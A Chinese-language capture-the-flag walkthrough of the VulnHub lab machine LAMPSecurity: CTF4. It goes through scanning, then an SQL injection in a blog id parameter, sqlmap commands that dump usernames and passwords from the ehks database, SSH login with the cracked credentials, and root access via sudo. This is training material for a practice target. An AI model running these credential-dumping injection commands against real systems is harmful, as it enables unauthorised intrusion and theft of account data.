LAMPSecurity: CTF4

实验环境：
攻击机：kali
靶机：LAMPSecurity: CTF4
靶场下载链接：http://www.vulnhub.com/entry/lampsecurity-ctf4,83/

信息收集

主机发现

使用arp-scan扫描局域网内的主机

该工具通过对局域网内所有可能的ip地址发送arp请求包，若得到响应，则证明该ip存在。

端口扫描

使用nmap对发现的主机进行端口扫描

Nmap是一款开源的网络探测和安全审核工具，适用于快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。

扫描结果显示存在 22 25 80 端口

漏洞挖掘

对80端口开放的web服务进行漏洞挖掘

威胁建模

通过 Wappalyzer 插件获取的目标靶机站点的相关信息

目录扫描

一些目录扫描工具：dirb dirbuster gobuster 御剑

在对博客页面测试时，发现id参数存在sql注入漏洞

漏洞利用


使用sqlmap对其进行注入

发现存在六个数据库

将注入侧重点放在ehks数据库（网站名为 Professor Ehks Center for Data Studies，猜测其中ehks数据库中含有可用于ssh登录的账号密码）
sqlmap -u "http://192.168.220.135/index.html?page=blog&title=Blog&id=2" --dbs -D ehks --tables

sqlmap -u "http://192.168.220.135/index.html?page=blog&title=Blog&id=2" --dbs -D ehks --tables -T user --columns

sqlmap -u "http://192.168.220.135/index.html?page=blog&title=Blog&id=2" --dbs -D ehks --tables -T user --columns -C user_name,user_pass --dump

使用默认的字典对密码解密，获得了ehsk数据库中的账号和密码
尝试使用第一个用户名和密码登录ssh

解决方法参考：https://www.infosecmatter.com/solution-for-ssh-unable-to-negotiate-errors/
成功使用ssh登录目标主机

权限提升

好家伙，直接一个sudo su就提升成了root权限
